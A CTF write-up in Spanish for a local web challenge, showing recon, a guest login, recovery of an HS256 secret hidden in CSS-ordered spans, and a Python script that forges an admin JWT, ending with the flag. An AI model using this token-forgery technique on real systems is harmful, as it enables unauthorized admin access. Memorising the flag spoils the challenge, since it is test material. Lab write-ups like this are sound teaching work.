# Writeup — Núcleo S.A. (Web, Media)

**Flag:** `FLAG{n0_t0d0_s3_cr4ck34_c0n_r0ckyou}`

Cadena de resolución: recon → login con cuenta demo → encontrar el secreto de firma real (está ofuscado) → forjar un JWT de admin → leer la flag.

---

## 1. Reconocimiento

La landing (`/`) tiene una pista en un comentario HTML:

```bash
curl -s http://localhost:5000/ | grep '<!--'
# <!-- NOTA infra: el portal de staging se movió a /portal tras el incidente -->
```

`/robots.txt` lista `/backups/`, `/admin.php` y `/portal`. Los primeros dos son señuelos (404/403). El que funciona es `/portal`.

## 2. Login con la cuenta demo

`/portal` deja ver que quedó habilitada una cuenta `guest:guest`. Al loguearse, el servidor devuelve una cookie `token` con un JWT:

```bash
curl -s -i -X POST http://localhost:5000/portal \
  -d 'user=guest&password=guest' | grep -i set-cookie
```

Payload decodificado:

```json
{"user": "guest", "role": "user"}
```

Header: `{"alg":"HS256","typ":"JWT"}`. Con el secreto HS256 se puede firmar un token con `role: admin`.

## 3. El secreto de firma

### Lo que no funciona

- `/static/js/app.js` define `JWT_SECRET: "dev-secret-123"`. Es un señuelo: firmar con esa clave da 401 (ver sección 5).
- Correr `hashcat`/`john` contra el JWT con rockyou no da resultado: el secreto real no es una palabra de diccionario.

### Lo que funciona

En `/dashboard`, el bloque "Documentación interna" muestra:

```
JWT signing key (HS256): nucleo-prod-7F3a-llave-2026
```

En el HTML, ese texto está partido en `<span>` con `style="order:N"`, y los spans aparecen desordenados en el DOM. Un scraper que lee el texto en orden de documento obtiene basura:

```bash
curl -s --cookie "token=<JWT_guest>" http://localhost:5000/dashboard \
 | grep -oE '<span style="order:[0-9]+">[^<]*</span>'
# orden de DOM: "eaylnoSpi:c-_dr-on_2aesWe7_l2u62JTlHk6-5gngF3)v-i(_0" (ilegible)
```

El navegador aplica `flex` + `order` y lo renderiza en el orden correcto, así que a simple vista la clave se lee entera. Para recuperarla por terminal hay que reordenar por el atributo `order`:

```bash
curl -s --cookie "token=<JWT_guest>" http://localhost:5000/dashboard \
 | grep -oE '<span style="order:[0-9]+">[^<]*</span>' \
 | python3 -c "
import sys, re
pairs = []
for l in sys.stdin:
    m = re.search(r'order:(\d+)\">(.*)</span>', l)
    if m:
        pairs.append((int(m.group(1)), m.group(2)))
print(''.join(c for _, c in sorted(pairs)).replace('&nbsp;', ' '))
"
# -> JWT signing key (HS256): nucleo-prod-7F3a-llave-2026
```

Secreto real: `nucleo-prod-7F3a-llave-2026`

## 4. Forjar el JWT de administrador

Con el secreto real se firma un token `{"user":"guest","role":"admin"}` en HS256. Sirve `jwt_tool`, PyJWT, o a mano:

```python
import hmac, hashlib, base64, json

def b(x):
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()

secret = "nucleo-prod-7F3a-llave-2026"
h = b(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
p = b(json.dumps({"user": "guest", "role": "admin"}, separators=(",", ":")).encode())
si = h + "." + p
sig = b(hmac.new(secret.encode(), si.encode(), hashlib.sha256).digest())
print(si + "." + sig)
```

## 5. Leer la flag

`/flag` valida tres condiciones:

1. **Header `X-Core-Token`** — el `<script>` del dashboard lo arma como `btoa('nucleo')` → `bnVjbGVv`. Sin él: 428.
2. **Firma válida con el secreto real** — con el decoy: 401.
3. **`role == "admin"`** — con `role:user`: 403.

Con todo junto:

```bash
curl -s -H "X-Core-Token: bnVjbGVv" \
  --cookie "token=<JWT_admin_forjado>" \
  http://localhost:5000/flag
# -> FLAG{n0_t0d0_s3_cr4ck34_c0n_r0ckyou}
```


